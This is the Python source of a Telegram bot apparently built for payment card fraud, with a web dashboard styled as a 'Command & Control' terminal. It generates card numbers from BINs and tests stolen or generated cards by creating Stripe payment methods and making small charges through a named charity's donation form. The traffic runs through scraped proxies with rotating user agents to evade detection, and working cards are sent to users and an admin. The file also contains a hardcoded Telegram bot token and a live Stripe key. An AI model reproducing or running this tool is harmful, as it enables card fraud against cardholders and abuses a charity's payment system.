import requests
import time
import json
import logging
import os
import threading
import telebot
import random
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string

# Flask app for Render (Web Service stability)
app = Flask(__name__)

@app.route('/')
def home():
    return "CC Checker is Running!"

# কনফিগারেশন: লগিং সেটআপ
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("gateway.log"),
        logging.StreamHandler()
    ]
)

# টেলিগ্রাম কনফিগারেশন
TELEGRAM_TOKEN = "8483748146:AAH-Ft5YXtB1okTYt0bp27ovKhkrA3bnGyE"
ADMIN_CHAT_ID = "6046372825" # রাখা হলো অ্যাডমিনকে আপডেট দেওয়ার জন্য

bot = telebot.TeleBot(TELEGRAM_TOKEN)

# Global Statistics
STATS = {
    "total_checked": 0,
    "hits": 0,
    "lives": 0,
    "dead": 0,
    "active_processes": 0,
    "start_time": time.time(),
    "proxy_count": 0,
    "proxy_success": 0,
    "proxy_errors": 0,
    "last_proxy_refresh": "Never",
    "vpn_sessions": [],
    "recent_events": []
}

def add_event(message, type="info"):
    """ সিস্টেম ইভেন্ট লগে নতুন মেসেজ যোগ করে """
    timestamp = time.strftime("%H:%M:%S")
    color = "#b0b0b0"
    if type == "hit": color = "#00ff88"
    if type == "live": color = "#6e7aff"
    if type == "proxy_pass": color = "#34d399"
    if type == "proxy_fail": color = "#f87171"
    
    event_html = f'<div class="event-item" style="border-left-color: {color}">[{timestamp}] {message}</div>'
    STATS["recent_events"].insert(0, event_html)
    if len(STATS["recent_events"]) > 25:
        STATS["recent_events"].pop()

# User specific control flags & settings
CONFIG_FILE = "user_config.json"
USER_PROCESSES = {} # {chat_id: {"checking": bool, "bingen": bool, "amount": str}}

def save_config():
    try:
        with open(CONFIG_FILE, "w") as f:
            # We only save amount and basic settings, not active checking state (to prevent loops on restart)
            serializable = {k: {"amount": v.get("amount", "1.00")} for k, v in USER_PROCESSES.items()}
            json.dump(serializable, f)
    except Exception as e:
        logging.error(f"Error saving config: {e}")

def load_config():
    global USER_PROCESSES
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                for k, v in data.items():
                    USER_PROCESSES[int(k)] = {"checking": False, "bingen": False, "amount": v.get("amount", "1.00")}
        except Exception as e:
            logging.error(f"Error loading config: {e}")

# Initial load
load_config()

# User Agents and Proxy List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
]

PROXY_LIST = []
FETCH_LOCK = threading.Lock()

def fetch_proxies():
    """ একাধিক সোর্স থেকে প্রক্সি এবং VPN Gate ডেটা ফেচ করে """
    global PROXY_LIST, STATS
    if not FETCH_LOCK.acquire(blocking=False):
        return # সেশন অলরেডি ডেটা ফেচ করছে
        
    try:
        new_proxies = []
        sessions = []
        
        # 1. HTTP Proxy Sources (Stripe API এর জন্য)
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://proxyspace.pro/http.txt"
        ]
        
        for url in proxy_sources:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    extracted = [p.strip() for p in response.text.split('\n') if p.strip() and ":" in p]
                    new_proxies.extend(extracted)
                    if len(new_proxies) > 500: break
            except: continue

        # 2. VPN Gate Status (Dashboard মনিটর এর জন্য)
        try:
            url = "https://www.vpngate.net/api/iphone/"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                raw_lines = response.text.strip().split('\n')
                for line in raw_lines[2:22]: # Top 20
                    parts = line.split(',')
                    if len(parts) >= 15:
                        speed = parts[4].strip()
                        mbps = round(int(speed) / 1000000, 1) if speed.isdigit() else 0
                        sessions.append({
                            "country": parts[6].strip(),
                            "protocol": "OpenVPN",
                            "mbps": mbps
                        })
                if sessions:
                    STATS["vpn_sessions"] = sessions
        except: pass

        if new_proxies:
            PROXY_LIST = list(set(new_proxies))
            STATS["proxy_count"] = len(PROXY_LIST)
            STATS["last_proxy_refresh"] = time.strftime("%H:%M:%S")
            add_event(f"Network Nodes Resynced: {len(PROXY_LIST)} Proxies Online", type="proxy_pass")
        else:
            STATS["proxy_errors"] += 1
            add_event("Warning: Network Source Interrupted. Retrying...", type="proxy_fail")
            
    finally:
        FETCH_LOCK.release()

def fetch_vpn_gate_data():
    """ Alias """
    fetch_proxies()


def get_random_proxy():
    global STATS
    if not PROXY_LIST:
        fetch_proxies()
    if PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    return None

def proxy_refresher():
    while True:
        fetch_proxies()
        fetch_vpn_gate_data()
        # যদি কোনো প্রক্সি না পায় তাহলে দ্রুত ট্রাই করবে, পেলে ১০ মিনিট পর
        sleep_time = 30 if not PROXY_LIST else 600
        time.sleep(sleep_time)

# Global control flags (Deprecated: use USER_PROCESSES)
IS_CHECKING = True
IS_BINGEN_ACTIVE = False

def generate_cards(pattern, count=10, month=None, year=None, cvc=None):
    """ BIN বা প্যাটার্ন থেকে র্যান্ডম কার্ড জেনারেট করে (e.g. 451101xxxxxx0xxx) """
    cards = []
    pattern = str(pattern).replace(" ", "").upper()
    
    if len(pattern) == 6 and pattern.isdigit():
        pattern = pattern + "xxxxxxxxxx"
    elif len(pattern) < 16:
        pattern = pattern.ljust(16, "X")

    for _ in range(count):
        number = list(pattern)
        # Fill in X's for the first 15 digits
        for i in range(min(len(number), 15)):
            if number[i] == 'X':
                number[i] = str(random.randint(0, 9))
        
        # If the 16th digit exists and is X, calculate Luhn
        if len(number) >= 16 and number[15] == 'X':
            temp_num = "".join(number[:15])
            digits = [int(d) for d in temp_num]
            # Use standard Luhn doubling (from right to left of the 15 digits)
            # Index 14 (15th digit) -> no double, 13 -> double, 12 -> no double...
            for i in range(len(digits) - 1, -1, -2):
                digits[i] *= 2
                if digits[i] > 9:
                    digits[i] -= 9
            total = sum(digits)
            check_digit = (10 - (total % 10)) % 10
            number[15] = str(check_digit)
        elif len(number) >= 16 and number[15] == 'X':
             # Fallback if anything weird happens
             number[15] = str(random.randint(0, 9))
        
        card_num = "".join(number)
        c_month = month if month else str(random.randint(1, 12)).zfill(2)
        c_year = year if year else str(random.randint(2025, 2030))
        c_cvc = cvc if cvc else str(random.randint(100, 999))
        cards.append(f"{card_num}|{c_month}|{c_year}|{c_cvc}")
    return cards

def send_telegram_msg(chat_id, message):
    """ নির্দিষ্ট চ্যাট আইডিতে মেসেজ পাঠায় """
    try:
        bot.send_message(chat_id, message, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Telegram Error for {chat_id}: {e}")

def create_stripe_payment_method(card_details):
    """ Stripe API ব্যবহার করে PM ID তৈরি করে। """
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_public_key = "pk_live_51LFRxaD3IeQSSaLaxSFaLLYacZ2NRCw3Kl9GR8rEsC9SpmWIspS6996OAbAyKX5lLX8QU8QKCel7xfB5zZhpqerc0067MXNyR2" 
    
    headers = {
        "Authorization": f"Bearer {stripe_public_key}", 
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "User-Agent": random.choice(USER_AGENTS)
    }
    
    data = {
        "type": "card",
        "card[number]": card_details['number'],
        "card[exp_month]": card_details['month'],
        "card[exp_year]": card_details['year'],
        "card[cvc]": card_details['cvc'],
        "billing_details[email]": card_details.get('email', 'test@example.com'),
        "payment_user_agent": "stripe.js/e00a62b424; stripe-js-v3/e00a62b424; card-element",
        "time_on_page": str(int(time.time() % 100000)),
    }
    
    proxy = get_random_proxy()
    try:
        response = requests.post(stripe_url, headers=headers, data=data, timeout=15, proxies=proxy)
        if response.status_code == 200:
            STATS["proxy_success"] += 1
            add_event(f"Proxy Pass ✅ | {proxy['http'].split('@')[-1]}", type="proxy_pass")
            return response.json().get('id')
        else:
            STATS["proxy_errors"] += 1
            add_event(f"Proxy Fail ❌ | Status: {response.status_code}", type="proxy_fail")
            return None
    except Exception as e:
        STATS["proxy_errors"] += 1
        add_event(f"Proxy Error ⚠️ | {str(e)[:30]}", type="proxy_fail")
        return None

def process_donation(payment_method_id, user_info, amount="1.00"):
    """ চ্যারিটি সাইটে ডোনেশন সম্পন্ন করে। """
    url = "https://palestinecharity.org/wp-admin/admin-ajax.php"
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://palestinecharity.org",
        "Referer": "https://palestinecharity.org/give/donate-for-us?giveDonationFormInIframe=1",
        "User-Agent": random.choice(USER_AGENTS),
        "X-Requested-With": "XMLHttpRequest",
    }
    payload = {
        "action": "give_process_donation",
        "give-form-id": "66",
        "give-amount": amount,
        "give_payment_mode": "stripe",
        "give_stripe_payment_method": payment_method_id,
        "give_first_name": user_info['first_name'],
        "give_last_name": user_info['last_name'],
        "give_email": user_info['email'],
        "give_title": "Mr",
        "give_action": "purchase",
    }

    proxy = get_random_proxy()
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=20, proxies=proxy)
        if "Success" in response.text or response.status_code == 302 or "thank-you" in response.text:
            STATS["proxy_success"] += 1
            return "SUCCESS"
        STATS["proxy_errors"] += 1
        return f"FAILED: {response.text[:50]}"
    except Exception as e:
        STATS["proxy_errors"] += 1
        return f"ERROR: {str(e)}"

def check_card(card_line, chat_id):
    """ একটি একক কার্ড চেক করার ফাংশন। """
    global STATS
    
    # User's checking state
    if chat_id not in USER_PROCESSES or not USER_PROCESSES[chat_id].get("checking", False):
        return

    card_line = card_line.strip()
    if not card_line or "|" not in card_line:
        return
    
    try:
        parts = card_line.split("|")
        # Handle cases with more or fewer parts if needed, but standard is 4
        if len(parts) < 4: return
        
        card = {
            "number": parts[0],
            "month": parts[1],
            "year": parts[2],
            "cvc": parts[3],
            "email": f"user_{int(time.time()*100)}@gmail.com"
        }
    except Exception:
        return

    user = {"first_name": "Jhon", "last_name": "Doe", "email": card['email']}
    
    # Show checking activity on dashboard
    add_event(f"CHECKING 🔍 | {card['number'][:6]}xxxx|{card['month']}|{card['year']}", type="info")
    
    # Get user's custom amount
    amount = USER_PROCESSES.get(chat_id, {}).get("amount", "1.00")
    
    STATS["total_checked"] += 1
    pm_id = create_stripe_payment_method(card)
    
    if pm_id:
        result = process_donation(pm_id, user, amount=amount)
        cc_num, cc_mon, cc_year, cc_cvc = parts[0], parts[1], parts[2], parts[3]
        
        if result == "SUCCESS":
            msg = (
                "🔥 *APPROVED - CC HIT!* 🔥\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"💳 *Card:* `{cc_num}`\n"
                f"📅 *Expiry:* `{cc_mon}/{cc_year}`\n"
                f"🔑 *CVC:* `{cc_cvc}`\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"✅ *Status:* Charged ${amount}\n"
                "🌍 *Gateway:* Palestine Charity (Stripe)\n"
                "🤖 *Checked by:* @sbscc_bot\n"
                "━━━━━━━━━━━━━━━━━━"
            )
            STATS["hits"] += 1
            # Log full card detail to dashboard activity
            add_event(f"HIT 🔥 | {cc_num}|{cc_mon}|{cc_year}|{cc_cvc} | ${amount}", type="hit")
            send_telegram_msg(chat_id, msg)
            if str(chat_id) != str(ADMIN_CHAT_ID):
                 send_telegram_msg(ADMIN_CHAT_ID, f"User {chat_id} got a hit! 🔥\n`{cc_num}`")
            with open("hits.txt", "a") as f:
                f.write(f"{card_line} | User: {chat_id}\n")
        
        elif any(word in result.lower() for word in ["insufficient", "funds", "cvc", "security code", "3d", "authenticate"]):
            # This is a LIVE CC (Not charged but active)
            msg = (
                "✅ *LIVE - CC!* ✅\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"💳 *Card:* `{cc_num}`\n"
                f"📅 *Expiry:* `{cc_mon}/{cc_year}`\n"
                f"🔑 *CVC:* `{cc_cvc}`\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"ℹ️ *Status:* Live (Not Charged)\n"
                f"📝 *Reason:* {result.replace('FAILED: ', '')[:30]}\n"
                "🌍 *Gateway:* Palestine Charity\n"
                "🤖 *Checked by:* @sbscc_bot\n"
                "━━━━━━━━━━━━━━━━━━"
            )
            STATS["lives"] += 1
            add_event(f"LIVE ✅ | {cc_num}|{cc_mon}|{cc_year} | {result.replace('FAILED: ', '')[:20]}", type="live")
            send_telegram_msg(chat_id, msg)
            with open("lives.txt", "a") as f:
                f.write(f"{card_line} | Reason: {result}\n")
        else:
            STATS["dead"] += 1
            # add_event(f"DEAD ❌ | {cc_num[:6]}xxxx") # Optional: dead logs make activity very messy
            with open("dead.txt", "a") as f:
                f.write(f"{card_line} | Reason: {result}\n")
    else:
        STATS["dead"] += 1
        # Optional: Notify user about dead cards with truncated number
        # send_telegram_msg(chat_id, f"❌ *DEAD:* `{card['number'][:6]}xxxx` (Stripe Error)")
        with open("dead.txt", "a") as f:
            f.write(f"{card_line} | Reason: Stripe Declined\n")

def start_bulk_check(cards_list, chat_id, is_silent=False):
    """ মাল্টি-থ্রেডিং এ চেক শুরু করে। """
    global STATS
    threads = 50 
    
    if not is_silent:
        send_telegram_msg(chat_id, f"🚀 *Checking Started...*\nTotal Cards: `{len(cards_list)}`")

    # Ensure user is in USER_PROCESSES
    if chat_id not in USER_PROCESSES:
        USER_PROCESSES[chat_id] = {"checking": True, "bingen": False}
    else:
        USER_PROCESSES[chat_id]["checking"] = True

    STATS["active_processes"] += 1
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Pass chat_id to check_card
            executor.map(lambda c: check_card(c, chat_id), cards_list)
    finally:
        STATS["active_processes"] -= 1
        
    if not is_silent:
        send_telegram_msg(chat_id, "🏁 *Checking Completed!*")

# টেলিগ্রাম বট হ্যান্ডলার
@bot.message_handler(commands=['start'])
def welcome(message):
    welcome_text = (
        "👋 *Welcome to CC Checker Bot!*\n\n"
        "📜 *Available Commands:*\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🔹 `/chk card|mon|year|cvc` - Direct Card Check\n"
        "🔹 `/bin 451101` - Generate 10 Cards from BIN\n"
        "🔹 `/bingen 451101` - Unlimited Auto-Gen & Check\n"
        "🔹 `/amount 5.00` - Set Custom Charge Amount\n"
        "🔹 `/stop` - Stop ongoing Processes\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "📥 *Other ways to check:*\n"
        "1️⃣ Send card list directly as a message.\n"
        "2️⃣ Send a `.txt` file with your cards.\n\n"
        "🚀 *System Status: Online & Healthy!*"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        content = downloaded_file.decode('utf-8')
        lines = content.split('\n')
        valid_cards = [l.strip() for l in lines if "|" in l]
        
        if valid_cards:
            threading.Thread(target=start_bulk_check, args=(valid_cards, chat_id), daemon=True).start()
        else:
            bot.reply_to(message, "❌ No valid cards found in the file.")
    else:
        bot.reply_to(message, "❌ Please send only `.txt` files.")

@bot.message_handler(commands=['stop'])
def stop_process(message):
    chat_id = message.chat.id
    if chat_id in USER_PROCESSES:
        USER_PROCESSES[chat_id]["checking"] = False
        USER_PROCESSES[chat_id]["bingen"] = False
    bot.reply_to(message, "🛑 *Process Stopped Successfully!*", parse_mode="Markdown")

@bot.message_handler(commands=['bin'])
def handle_bin(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Use: `/bin 451101`", parse_mode="Markdown")
            return
        
        bin_num = parts[1]
        cards = generate_cards(bin_num, count=10)
        resp = "🎲 *Generated Cards:*\n\n" + "\n".join([f"`{c}`" for c in cards])
        bot.reply_to(message, resp, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

def bingen_loop(bin_num, chat_id):
    if chat_id not in USER_PROCESSES:
        USER_PROCESSES[chat_id] = {"checking": True, "bingen": True}
    else:
        USER_PROCESSES[chat_id]["checking"] = True
        USER_PROCESSES[chat_id]["bingen"] = True

    send_telegram_msg(chat_id, f"🚀 *BinGen Started:* `{bin_num}`\nUnlimited checking active...\nUse `/stop` to end.")
    
    while USER_PROCESSES.get(chat_id, {}).get("bingen", False) and USER_PROCESSES.get(chat_id, {}).get("checking", False):
        cards = generate_cards(bin_num, count=50)
        start_bulk_check(cards, chat_id, is_silent=True)
        time.sleep(1) # Small delay between batches

@bot.message_handler(commands=['bingen'])
def handle_bingen(message):
    chat_id = message.chat.id
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Use: `/bingen 451101` or `/bingen 451101xxxxxx0xxx`", parse_mode="Markdown")
            return
        
        bin_num = parts[1]
        if USER_PROCESSES.get(chat_id, {}).get("bingen", False):
            bot.reply_to(message, "⚠️ A BinGen process is already running for you. use `/stop` first.")
            return
            
        threading.Thread(target=bingen_loop, args=(bin_num, chat_id), daemon=True).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['chk'])
def handle_chk(message):
    chat_id = message.chat.id
    try:
        input_text = message.text.replace('/chk', '').strip()
        lines = input_text.split('\n')
        valid_cards = [l.strip() for l in lines if "|" in l]
        
        if valid_cards:
            threading.Thread(target=start_bulk_check, args=(valid_cards, chat_id), daemon=True).start()
        else:
            bot.reply_to(message, "❌ Invalid format. Use: `/chk number|month|year|cvc`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['amount'])
def handle_amount(message):
    chat_id = message.chat.id
    try:
        parts = message.text.split()
        if len(parts) < 2:
            current_amt = USER_PROCESSES.get(chat_id, {}).get("amount", "1.00")
            bot.reply_to(message, f"💰 *Current Charge Amount:* `${current_amt}`\nUse `/amount 5.00` to change it.", parse_mode="Markdown")
            return
        
        new_amount = parts[1].replace('$', '')
        # Basic validation (ensure it's a number)
        float(new_amount)
        
        if chat_id not in USER_PROCESSES:
            USER_PROCESSES[chat_id] = {"checking": False, "bingen": False, "amount": new_amount}
        else:
            USER_PROCESSES[chat_id]["amount"] = new_amount
        
        save_config()
        bot.reply_to(message, f"✅ *Amount Set:* Charge amount updated to `${new_amount}`\n(Settings saved locally for restart persistence)", parse_mode="Markdown")
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount. Please use a number like `1.00` or `0.50`")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['status', 'health'])
def handle_status(message):
    uptime = int(time.time() - STATS["start_time"])
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    proxy_health = "Excellent ✅" if STATS["proxy_errors"] < STATS["proxy_success"] else "Poor ⚠️"
    if STATS["proxy_count"] == 0: proxy_health = "Critical ❌ (No Proxies)"

    status_text = (
        "📊 *System Health Report*\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"⏱ *Uptime:* `{hours}h {minutes}m {seconds}s`\n"
        f"👥 *Active Users:* `{len(USER_PROCESSES)}` \n"
        f"🔍 *Total Checked:* `{STATS['total_checked']}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🌐 *Proxy Statistics*\n"
        f"🔹 *Status:* {proxy_health}\n"
        f"🔹 *Total Proxies:* `{STATS['proxy_count']}`\n"
        f"🔹 *Success/Fail:* `{STATS['proxy_success']}`/`{STATS['proxy_errors']}`\n"
        f"🔹 *Last Refresh:* `{STATS['last_proxy_refresh']}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "✅ *All Systems Operational!*"
    )
    bot.reply_to(message, status_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    chat_id = message.chat.id
    lines = message.text.split('\n')
    valid_cards = [l.strip() for l in lines if "|" in l]
    
    if valid_cards:
        threading.Thread(target=start_bulk_check, args=(valid_cards, chat_id), daemon=True).start()
    else:
        # Optional: only reply if it looks like a card list attempt but failed
        if "|" in message.text:
             bot.reply_to(message, "❌ Invalid format. Please use: `number|month|year|cvc`")

def run_bot():
    # Wait inside the thread so we don't block the main server startup
    add_event("Bot System: Initializing protocols...", type="info")
    logging.info("BotThread started. Waiting 5s for old instance clearance...")
    time.sleep(5)
    
    while True:
        try:
            add_event("Bot System: Clearing webhooks/sessions...", type="info")
            logging.info("Clearing any existing Telegram sessions/webhooks...")
            bot.remove_webhook()
            time.sleep(2) 
            
            add_event("Bot System: POLLING_ACTIVE ● ONLINE", type="hit")
            logging.info("Telegram Bot Polling Started...")
            # Notify Admin
            try:
                bot.send_message(ADMIN_CHAT_ID, "🚀 *Bot is now ONLINE and ready!*", parse_mode="Markdown")
            except: pass
            
            bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=20)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 409:
                add_event("Bot System: Conflict (409) - Retrying...", type="proxy_fail")
                logging.warning("Conflict detected (409). Retrying in 10s...")
                time.sleep(10)
            else:
                add_event(f"Bot System: API Error ({e.error_code})", type="proxy_fail")
                logging.error(f"Telegram API Error: {e}")
                time.sleep(10)
        except Exception as e:
            add_event(f"Bot System: Internal Error ({str(e)[:20]})", type="proxy_fail")
            logging.error(f"Bot Polling Error: {e}")
            time.sleep(10)

@app.route('/health')
def health():
    uptime = int(time.time() - STATS["start_time"])
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}h {minutes}m {seconds}s"
    
    events_html = "".join(STATS["recent_events"])

    html_template = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SBS TERMINAL | Command & Control</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Play:wght@400;700&display=swap" rel="stylesheet">
        <style>
            :root {{
                --cyber-green: #00ff41;
                --cyber-blue: #00f2ff;
                --cyber-purple: #bc13fe;
                --cyber-red: #ff3131;
                --bg-black: #0a0a0c;
                --card-dark: #121217;
            }}

            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            
            body {{
                background: var(--bg-black);
                color: #e0e0e0;
                font-family: 'Play', sans-serif;
                overflow-x: hidden;
                background-image: 
                    linear-gradient(rgba(18, 18, 23, 0.8) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(18, 18, 23, 0.8) 1px, transparent 1px);
                background-size: 30px 30px;
            }}

            .vignette {{
                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: radial-gradient(circle, transparent 40%, rgba(0,0,0,0.8) 100%);
                pointer-events: none; z-index: 10;
            }}

            .container {{
                max-width: 1300px; margin: 0 auto; padding: 1.5rem; position: relative; z-index: 1;
            }}

            /* Header Section */
            header {{
                display: flex; justify-content: space-between; align-items: center;
                padding-bottom: 1.5rem; border-bottom: 2px solid #222; margin-bottom: 2rem;
            }}

            .logo-area {{ display: flex; align-items: center; gap: 15px; }}
            .logo-hex {{
                width: 50px; height: 50px; background: var(--cyber-blue);
                clip-path: polygon(25% 0%, 75% 0%, 100% 50%, 75% 100%, 25% 100%, 0% 50%);
                display: flex; align-items: center; justify-content: center;
                color: #000; font-weight: bold; font-size: 1.5rem;
                box-shadow: 0 0 20px var(--cyber-blue);
            }}

            .system-nodes {{ display: flex; gap: 20px; }}
            .node {{ display: flex; align-items: center; gap: 8px; font-size: 0.8rem; letter-spacing: 1px; color: #666; }}
            .node.active {{ color: var(--cyber-green); }}
            .pulse-dot {{
                width: 8px; height: 8px; border-radius: 50%; background: currentColor;
                box-shadow: 0 0 10px currentColor; animation: pulse 1.5s infinite;
            }}
            @keyframes pulse {{ 0% {{ opacity: 0.3; }} 50% {{ opacity: 1; }} 100% {{ opacity: 0.3; }} }}

            /* Stats Grid */
            .stats-grid {{
                display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem;
            }}

            .stat-card {{
                background: var(--card-dark); border: 1px solid #222; padding: 1.5rem;
                border-radius: 4px; position: relative; overflow: hidden;
            }}

            .stat-card::after {{
                content: ''; position: absolute; bottom: 0; left: 0; width: 4px; height: 0%;
                background: var(--cyber-blue); transition: 0.3s;
            }}
            .stat-card:hover::after {{ height: 100%; }}

            .stat-label {{ color: #777; font-size: 0.7rem; text-transform: uppercase; margin-bottom: 10px; display: block; }}
            .stat-value {{ font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; color: #fff; }}
            .val-hits {{ color: var(--cyber-green); }}
            .val-lives {{ color: var(--cyber-blue); }}
            .val-dead {{ color: var(--cyber-red); }}

            /* Central Console */
            .console-layout {{
                display: grid; grid-template-columns: 2fr 1fr; gap: 1.5rem;
            }}

            .panel-header {{
                background: #1a1a20; padding: 10px 15px; border-radius: 4px 4px 0 0;
                border: 1px solid #333; display: flex; justify-content: space-between; align-items: center;
                font-size: 0.8rem; font-weight: bold; color: #aaa;
            }}

            .terminal-window {{
                background: #0d0d12; border: 1px solid #333; border-top: none; padding: 1rem;
                height: 500px; overflow-y: auto; font-family: 'JetBrains Mono', monospace;
                box-shadow: inset 0 0 30px rgba(0,0,0,0.5);
            }}

            .event-item {{
                padding: 8px 12px; margin-bottom: 6px; border-left: 3px solid #333;
                background: rgba(255,255,255,0.02); font-size: 0.85rem; line-height: 1.4;
                animation: slideIn 0.3s ease-out;
            }}

            @keyframes slideIn {{ from {{ opacity: 0; transform: translateX(-10px); }} to {{ opacity: 1; transform: translateX(0); }} }}

            .footer-strip {{
                margin-top: 3rem; text-align: center; color: #333; font-size: 0.7rem;
                letter-spacing: 2px; text-transform: uppercase; padding-top: 1rem; border-top: 1px solid #111;
            }}

            @media (max-width: 900px) {{ .console-layout {{ grid-template-columns: 1fr; }} }}
        </style>
        <script>setTimeout(() => location.reload(), 10000);</script>
    </head>
    <body>
        <div class="vignette"></div>
        <div class="container">
            <header>
                <div class="logo-area">
                    <div class="logo-hex">S</div>
                    <div>
                        <h1 style="font-size: 1.1rem; color: #fff; letter-spacing: 2px;">SBS CONTROL CENTER</h1>
                        <p style="font-size: 0.6rem; color: #555;">ENCRYPTED SESSION ACTIVE // V4.2.0</p>
                    </div>
                </div>
                <div class="system-nodes">
                    <div class="node active"><div class="pulse-dot"></div> MAIN_FRAME</div>
                    <div class="node active"><div class="pulse-dot"></div> PROXY_NET</div>
                    <div class="node active"><div class="pulse-dot" style="animation-delay: 0.5s"></div> STRI_GATE</div>
                </div>
            </header>

            <div class="stats-grid">
                <div class="stat-card">
                    <span class="stat-label">System Uptime</span>
                    <div class="stat-value" style="font-size: 1.4rem;">{uptime_str}</div>
                </div>
                <div class="stat-card">
                    <span class="stat-label">Analyzed Cards</span>
                    <div class="stat-value">{STATS['total_checked']}</div>
                </div>
                <div class="stat-card">
                    <span class="stat-label">Confirmed Hits</span>
                    <div class="stat-value val-hits">{STATS['hits']}</div>
                </div>
                <div class="stat-card">
                    <span class="stat-label">Live Detected</span>
                    <div class="stat-value val-lives">{STATS['lives']}</div>
                </div>
                <div class="stat-card">
                    <span class="stat-label">Dead Drops</span>
                    <div class="stat-value val-dead">{STATS['dead']}</div>
                </div>
            </div>

            <div class="console-layout">
                <div class="terminal-container">
                    <div class="panel-header">
                        <span>LIVE_ACTIVITY_STREAM.log</span>
                        <span style="color: var(--cyber-green)">● RUNNING</span>
                    </div>
                    <div class="terminal-window">
                        {events_html if events_html else '<div class="event-item">SCANNIG NETWORK... WAITING FOR INCOMING DATA...</div>'}
                    </div>
                </div>

                <div class="side-panels">
                    <div class="panel-header">NETWORK_PROXIES</div>
                    <div class="stat-card" style="border-radius: 0 0 4px 4px; border-top: none;">
                        <p style="font-size: 0.8rem; margin-bottom: 10px;">Status: <span style="color:var(--cyber-green)">ONLINE</span></p>
                        <p style="font-size: 0.8rem; margin-bottom: 10px;">Active Nodes: <span style="color:#fff">{STATS['proxy_count']}</span></p>
